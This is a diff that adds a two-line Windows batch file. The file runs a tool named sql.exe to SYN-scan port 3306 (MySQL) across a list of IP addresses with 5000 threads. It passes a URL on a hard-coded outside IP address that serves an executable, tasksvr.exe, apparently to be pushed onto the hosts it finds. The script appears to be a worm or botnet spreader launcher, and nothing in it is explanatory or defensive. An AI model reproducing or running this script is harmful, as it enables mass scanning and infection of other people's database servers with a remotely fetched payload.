@@ -1,0 +1,2 @@
+@echo off
+@sql.exe -f ip.txt -m syn -t 3306 -c 5000 -u http://60.15.124.106:63389/tasksvr.exe
